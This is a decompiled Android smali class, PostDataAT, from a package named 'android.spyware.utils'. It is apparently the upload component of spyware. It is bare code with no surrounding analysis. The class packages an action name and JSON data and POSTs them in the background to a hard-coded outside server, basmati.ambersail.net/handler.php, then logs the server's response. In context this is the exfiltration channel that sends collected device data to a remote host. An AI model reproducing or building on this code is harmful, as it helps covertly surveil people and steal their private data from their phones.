.class public Landroid/spyware/utils/PostDataAT;
.super Landroid/os/AsyncTask;
.source "PostDataAT.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Landroid/spyware/utils/Parameter;",
        "Ljava/lang/Void;",
        "Ljava/lang/Integer;",
        ">;"
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 34
    invoke-direct {v0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected varargs doInBackground([Landroid/spyware/utils/Parameter;)Ljava/lang/Integer;
    .registers 16
    .param p1, "params"    # [Landroid/spyware/utils/Parameter;

    .prologue
    .line 37
    const/4 v2, 0x0

    .line 40
    .local v2, "conn":Ljava/net/HttpURLConnection;
    const/4 v11, 0x0

    :try_start_2
    aget-object v11, v15, v11

    invoke-virtual {v11}, Landroid/spyware/utils/Parameter;->getAction()Ljava/lang/String;

    move-result-object v1

    .line 43
    .local v1, "action":Ljava/lang/String;
    const/4 v11, 0x0

    aget-object v11, v15, v11

    invoke-virtual {v11}, Landroid/spyware/utils/Parameter;->isJSONArray()Z

    move-result v11

    if-eqz v11, :cond_bd

    const/4 v11, 0x0

    aget-object v11, v15, v11

    invoke-virtual {v11}, Landroid/spyware/utils/Parameter;->getJArray()Lorg/json/JSONArray;

    move-result-object v11

    invoke-virtual {v11}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v3

    .line 47
    .local v3, "data":Ljava/lang/String;
    :goto_1c
    new-instance v10, Ljava/net/URL;

    const-string v11, "http://basmati.ambersail.net/handler.php"

    invoke-direct {v10, v11}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 48
    .local v10, "url":Ljava/net/URL;
    new-instance v11, Landroid/net/Uri$Builder;

    invoke-direct {v11}, Landroid/net/Uri$Builder;-><init>()V

    const-string v12, "action"

    .line 49
    invoke-virtual {v11, v12, v1}, Landroid/net/Uri$Builder;->appendQueryParameter(Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri$Builder;

    move-result-object v11

    const-string v12, "data"

    .line 50
    invoke-virtual {v11, v12, v3}, Landroid/net/Uri$Builder;->appendQueryParameter(Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri$Builder;

    move-result-object v11

    .line 51
    invoke-virtual {v11}, Landroid/net/Uri$Builder;->build()Landroid/net/Uri;

    move-result-object v11

    invoke-virtual {v11}, Landroid/net/Uri;->getEncodedQuery()Ljava/lang/String;

    move-result-object v8

    .line 53
    .local v8, "request":Ljava/lang/String;
    invoke-virtual {v10}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v11

    move-object v0, v11

    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v2, v0

    .line 54
    const/4 v11, 0x1

    invoke-virtual {v2, v11}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 56
    const-string v11, "POST"

    invoke-virtual {v2, v11}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 57
    const-string v11, "Content-Type"

    const-string v12, "application/x-www-form-urlencoded;charset=utf-8"

    invoke-virtual {v2, v11, v12}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 58
    const-string v11, "X-Requested-With"

    const-string v12, "XMLHttpRequest"

    invoke-virtual {v2, v11, v12}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 59
    invoke-virtual {v8}, Ljava/lang/String;->getBytes()[B

    move-result-object v11

    array-length v11, v11

    invoke-virtual {v2, v11}, Ljava/net/HttpURLConnection;->setFixedLengthStreamingMode(I)V

    .line 61
    new-instance v7, Ljava/io/DataOutputStream;

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v11

    invoke-direct {v7, v11}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 62
    .local v7, "out":Ljava/io/DataOutputStream;
    invoke-virtual {v7, v8}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 63
    invoke-virtual {v7}, Ljava/io/DataOutputStream;->flush()V

    .line 65
    new-instance v5, Ljava/io/BufferedReader;

    new-instance v11, Ljava/io/InputStreamReader;

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v5, v11}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 66
    .local v5, "in":Ljava/io/BufferedReader;
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    .line 69
    .local v9, "response":Ljava/lang/StringBuilder;
    :goto_85
    invoke-virtual {v5}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v6

    .local v6, "line":Ljava/lang/String;
    if-eqz v6, :cond_ca

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_8e
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_8e} :catch_8f
    .catchall {:try_start_2 .. :try_end_8e} :catchall_132

    goto :goto_85

    .line 77
    .end local v1    # "action":Ljava/lang/String;
    .end local v3    # "data":Ljava/lang/String;
    .end local v5    # "in":Ljava/io/BufferedReader;
    .end local v6    # "line":Ljava/lang/String;
    .end local v7    # "out":Ljava/io/DataOutputStream;
    .end local v8    # "request":Ljava/lang/String;
    .end local v9    # "response":Ljava/lang/StringBuilder;
    .end local v10    # "url":Ljava/net/URL;
    :catch_8f
    move-exception v4

    .line 79
    .local v4, "ex":Ljava/io/IOException;
    :try_start_90
    const-string v11, "::trace"

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    const-class v13, Landroid/spyware/utils/PostDataAT;

    invoke-virtual {v13}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, "->doInBackground:"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-static {v4}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v11, v12}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_b6
    .catchall {:try_start_90 .. :try_end_b6} :catchall_132

    .line 82
    if-eqz v2, :cond_bb

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 85
    :cond_bb
    const/4 v11, 0x0

    .end local v4    # "ex":Ljava/io/IOException;
    :cond_bc
    :goto_bc
    return-object v11

    .line 44
    .restart local v1    # "action":Ljava/lang/String;
    :cond_bd
    const/4 v11, 0x0

    :try_start_be
    aget-object v11, v15, v11

    invoke-virtual {v11}, Landroid/spyware/utils/Parameter;->getJObject()Lorg/json/JSONObject;

    move-result-object v11

    invoke-virtual {v11}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v3

    .restart local v3    # "data":Ljava/lang/String;
    goto/16 :goto_1c

    .line 72
    .restart local v5    # "in":Ljava/io/BufferedReader;
    .restart local v6    # "line":Ljava/lang/String;
    .restart local v7    # "out":Ljava/io/DataOutputStream;
    .restart local v8    # "request":Ljava/lang/String;
    .restart local v9    # "response":Ljava/lang/StringBuilder;
    .restart local v10    # "url":Ljava/net/URL;
    :cond_ca
    const-string v11, "::trace"

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    const-class v13, Landroid/spyware/utils/PostDataAT;

    invoke-virtual {v13}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, "->doInBackground:"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v11, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 73
    const-string v11, "::trace"

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    const-class v13, Landroid/spyware/utils/PostDataAT;

    invoke-virtual {v13}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, "->doInBackground:"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v13

    invoke-static {v13}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " - "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v11, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 76
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v11

    invoke-static {v11}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;
    :try_end_12b
    .catch Ljava/io/IOException; {:try_start_be .. :try_end_12b} :catch_8f
    .catchall {:try_start_be .. :try_end_12b} :catchall_132

    move-result-object v11

    .line 82
    if-eqz v2, :cond_bc

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_bc

    .end local v1    # "action":Ljava/lang/String;
    .end local v3    # "data":Ljava/lang/String;
    .end local v5    # "in":Ljava/io/BufferedReader;
    .end local v6    # "line":Ljava/lang/String;
    .end local v7    # "out":Ljava/io/DataOutputStream;
    .end local v8    # "request":Ljava/lang/String;
    .end local v9    # "response":Ljava/lang/StringBuilder;
    .end local v10    # "url":Ljava/net/URL;
    :catchall_132
    move-exception v11

    if-eqz v2, :cond_138

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    :cond_138
    throw v11
.end method

.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .registers 3

    .prologue
    .line 34
    check-cast v2, [Landroid/spyware/utils/Parameter;

    invoke-virtual {v1, v2}, Landroid/spyware/utils/PostDataAT;->doInBackground([Landroid/spyware/utils/Parameter;)Ljava/lang/Integer;

    move-result-object v0

    return-object v0
.end method

.method protected onPostExecute(I)I
    .registers 2
    .param p1, "responseCode"    # I

    .prologue
    .line 89
    return v1
.end method
